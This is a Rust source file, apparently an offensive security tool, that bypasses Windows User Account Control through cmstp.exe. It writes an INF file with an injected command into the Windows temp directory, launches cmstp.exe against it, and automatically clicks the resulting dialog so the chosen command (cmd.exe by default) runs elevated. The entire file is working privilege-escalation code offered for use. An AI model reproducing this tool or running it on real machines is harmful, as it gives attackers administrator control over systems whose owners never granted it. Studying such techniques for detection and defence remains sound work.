/*
 *   Bypass UAC by using CMSTP.exe
 *   @5mukx
 */

use std::env::args;
use std::ffi::CString;
use std::fs::File;
use std::io::{Error as IoError, Write};
use std::path::Path;
use std::process::{Command, Stdio};
use std::ptr::null_mut;
use winapi::um::winuser::{
    FindWindowA, FindWindowExA, SendMessageA, SetForegroundWindow, ShowWindow, BM_CLICK, SW_SHOWNORMAL,
};
use winapi::um::winuser::{SendInput, INPUT, INPUT_KEYBOARD, KEYBDINPUT, VK_RETURN};

#[derive(Debug)]
#[allow(dead_code)]
pub enum CustomError {
    Io(IoError),
    Process(String),
    WindowNotFound(String),
}

impl From<IoError> for CustomError {
    fn from(error: IoError) -> Self {
        CustomError::Io(error)
    }
}

static INF_TEMPLATE: &str = r#"[version]
Signature=$chicago$
AdvancedINF=2.5

[DefaultInstall]
CustomDestination=CustInstDestSectionAllUsers
RunPreSetupCommands=RunPreSetupCommandsSection

[RunPreSetupCommandsSection]
REPLACE_COMMAND_LINE
taskkill /IM cmstp.exe /F

[CustInstDestSectionAllUsers]
49000,49001=AllUSer_LDIDSection, 7

[AllUSer_LDIDSection]
"HKLM", "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\App Paths\\CMMGR32.EXE", "ProfileInstallPath", "%UnexpectedError%", ""

[Strings]
ServiceName="CorpVPN"
ShortSvcName="CorpVPN"
"#;

fn generate_inf_file(command: &str) -> Result<String, CustomError> {
    let temp_dir = "C:\\windows\\temp";
    let random_file_name = format!("{}\\{}.inf", temp_dir, uuid::Uuid::new_v4());
    let inf_data = INF_TEMPLATE.replace("REPLACE_COMMAND_LINE", command);

    let mut file = File::create(&random_file_name)?;
    file.write_all(inf_data.as_bytes())?;
    Ok(random_file_name)
}

fn execute_cmstp(inf_file: &str) -> Result<(), CustomError> {
    let binary_path = "C:\\windows\\system32\\cmstp.exe";
    if !Path::new(binary_path).exists() {
        return Err(CustomError::Process("cmstp.exe binary not found!".to_string()));
    }

    let mut child = Command::new(binary_path)
    .arg("/au")
    .arg(inf_file)
    .stdout(Stdio::null())
    .stderr(Stdio::null())
    .spawn()
    .map_err(|e| CustomError::Process(format!("Failed to start cmstp.exe: {}", e)))?;

    let window_titles = ["CorpVPN", "cmstp"];
    for title in &window_titles {
        if interact_with_window(title)? {
            break;
        }
    }

    child.wait()?;
    Ok(())
}

fn interact_with_window(process_name: &str) -> Result<bool, CustomError> {
    let class_name = CString::new(process_name).map_err(|_| CustomError::WindowNotFound("Failed to create CString for window title".to_string()))?;
    let ok_button_name = CString::new("OK").map_err(|_| CustomError::WindowNotFound("Failed to create CString for OK button".to_string()))?;

    loop {
        unsafe {
            let hwnd = FindWindowA(null_mut(), class_name.as_ptr());
            if hwnd.is_null() {
                continue; // Keep trying to find the window
            }

            SetForegroundWindow(hwnd);
            ShowWindow(hwnd, SW_SHOWNORMAL);

            let ok_button = FindWindowExA(
                hwnd,
                null_mut(),
                                          null_mut(),
                                          ok_button_name.as_ptr(),
            );
            if !ok_button.is_null() {
                SendMessageA(ok_button, BM_CLICK, 0, 0);
                return Ok(true);
            }

            simulate_keypress();
            return Ok(true);
        }
    }
}

fn simulate_keypress() {
    unsafe {
        let mut input = INPUT {
            type_: INPUT_KEYBOARD,
            u: std::mem::zeroed(),
        };

        *input.u.ki_mut() = KEYBDINPUT {
            wVk: VK_RETURN as u16,
            wScan: 0,
            dwFlags: 0,
            time: 0,
            dwExtraInfo: 0,
        };

        SendInput(1, &mut input, std::mem::size_of::<INPUT>() as i32);
    }
}

pub fn test_uac() -> Result<(), CustomError> {
    let args: Vec<String> = args().collect();

    let inf_file = match args.len() {
        1 => generate_inf_file("C:\\Windows\\System32\\cmd.exe")?,
        2 => generate_inf_file(&args[1])?,
        _ => return Err(CustomError::Process("Incorrect number of arguments. Use exactly one or none.".to_string())),
    };

    execute_cmstp(&inf_file)
}
